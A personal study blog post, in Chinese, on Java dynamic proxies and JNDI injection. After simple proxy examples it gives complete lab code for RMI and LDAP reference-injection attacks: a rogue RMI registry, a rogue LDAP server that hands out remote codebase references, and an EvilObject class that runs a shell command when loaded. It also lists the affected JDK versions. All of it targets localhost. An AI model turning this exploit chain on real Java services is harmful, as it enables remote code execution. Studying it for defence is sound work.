# Java RMI 学习


## 动态代理

定义：JVM在运行期动态创建class字节码并加载的过程

### JDK 动态代理

**java.lang.reflect.InvocationHandler**

```Java
Object invoke(Object proxy, Method method, Object[] args)
```

定义了代理对象调用方法时希望执行的动作，用于集中处理在动态代理类对象上的方法调用

**java.lang.reflect.Proxy**

```Java
static Object newProxyInstance(ClassLoader loader, Class[] interfaces, InvocationHandler h)
```

创建一个实例，需要三个参数：

1. 接口类的 `ClassLoader`
2. 接口数组
3. 处理接口方法调用的 `InvocationHandler` 实例。

```Java
static InvocationHandler getInvocationHandler(Object proxy)
```

获取指定代理对象所关联的调用处理器

```Java
static Class getProxyClass(ClassLoader loader, Class... interfaces)
```

获取指定接口的代理类

```Java
static boolean isProxyClass(Class cl)
```

判断 cl 是否为一个代理类

跟着写了一个动态代理的代码，比较简单的一小段

```Java
package com.mingzux;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;

public class DynamicProxy {
    public static void main(String[] args) {
        InvocationHandler handler = new InvocationHandler() {
            @Override
            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                System.out.println(method);
                if (method.getName().equals(&#34;morning&#34;)) {
                    System.out.println(&#34;Good Morning, &#34; &#43; args[0]);
                }
                return null;
            }
        };
        Hello hello = (Hello) Proxy.newProxyInstance(
                Hello.class.getClassLoader(),
                new Class[] { Hello.class },
                handler
        );
        hello.morning(&#34;Mingzu&#34;);
    }
}

interface Hello {
    void morning(String name);
}
```

## JNDI 注入

Java Naming and DirectoryInterface（Java命名和目录接口）

重要：需要知道 jdk 版本号

### RMI 攻击向量

JNDI 有一个 Reference 类表示对某个对象的引用，而对象的传递无非就是两种方式：

1. 按序列化方式存储（值传递）

2. 按引用的方式存储（引用传递）

利用技巧：

将恶意 Reference 类绑定在 RMI 注册表，指向远程 class 文件

当 JNDI 客户端 lookup() 函数外部可控或 Reference 类构造方法的 classFactoryLocation 参数外部可控时，实现加载远程 class 文件在本地执行，实现远程代码执行

RMIService.jvav

```Java
package com.mingzux.JNDI;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIService {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference refObj = new Reference(&#34;EvilObject&#34;, &#34;EvilObject&#34;, &#34;http://127.0.0.1:8000/&#34;);
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        System.out.println(&#34;Binding &#39;refObjWrapper&#39; to &#39;rmi://127.0.0.1:1099/refObj&#39;&#34;);
        registry.bind(&#34;refObj&#34;, refObjWrapper);
    }
}
```

JNDIClient.java

```Java
package com.mingzux.JNDI;

import javax.naming.Context;
import javax.naming.InitialContext;

public class JNDIClient {
    public static void main(String[] args) throws Exception {
        // System.setProperty(&#34;com.sun.jndi.rmi.object.trustURLCodebase&#34;, &#34;true&#34;);

        String uri = &#34;rmi://127.0.0.1:1099/refObj&#34;;
        Context ctx = new InitialContext();
        System.out.println(&#34;Using lookup() to fetch object with &#34; &#43; uri);
        ctx.lookup(uri);
    }
}
```

EvilObject.java

```Java
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class EvilObject {
    public EvilObject() throws Exception {
        Runtime rt = Runtime.getRuntime();
        String[] commands = {&#34;/bin/bash&#34;, &#34;-c&#34;, &#34;ls /&#34;};
        Process pc = rt.exec(commands);

        BufferedReader result = new BufferedReader(new InputStreamReader(pc.getInputStream()));

        String data;
        while((data = result.readLine()) != null) {
            System.out.println(data);
        }

        pc.waitFor();
    }
}
```

### LDAP 攻击向量

版本：8u191、7u201、6u211与8u121、7u131、6u141之间

利用技巧：与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址

&gt; 看了好几遍，然后边写边看跟着抄了一遍，大致了解了，先过（）

LdapServer.java

```Java
package com.mingzux.Ldap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

public class LdapServer {
    private static final String LDAP_BASE = &#34;dc=mingzux,dc=com&#34;;

    public static void main (String[] args) {
        String url = &#34;http://127.0.0.1:8000/#EvilObject&#34;;
        int port = 1234;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    &#34;listen&#34;,
                    InetAddress.getByName(&#34;0.0.0.0&#34;),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()
            ));
            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));

            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println(&#34;Listening on 0.0.0.0:&#34; &#43; port);
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;

        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        public void processSearchResult (InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            } catch (Exception e1) {
                e1.printStackTrace();
            }
        }

        protected void sendResult (InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#39;.&#39;, &#39;/&#39;).concat(&#34;.class&#34;));
            System.out.println(&#34;Send LDAP reference result for &#34; &#43; base &#43; &#34; redirecting to &#34; &#43; turl);
            e.addAttribute(&#34;javaClassName&#34;, &#34;Exploit&#34;);
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf(&#34;#&#34;);
            if (refPos &gt; 0) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute(&#34;javaCodeBase&#34;, cbstring);
            e.addAttribute(&#34;objectClass&#34;, &#34;javaNamingReference&#34;);
            e.addAttribute(&#34;javaFactory&#34;, this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

JNDIClient.java

```Java
package com.mingzux.Ldap;

import javax.naming.Context;
import javax.naming.InitialContext;

public class JNDIClient {
    public static void main(String[] args) throws Exception {
        String uri = &#34;ldap://127.0.0.1:1234/remoteObj&#34;;
        Context ctx = new InitialContext();
        System.out.println(&#34;Using lookup() to fetch object with &#34; &#43; uri);
        ctx.lookup(uri);
    }
}
```

EvilObject.java 没变，跟上一节一样


---

> 作者:   
> URL: https://m1ng2u.github.io/cybersec/470020000/  

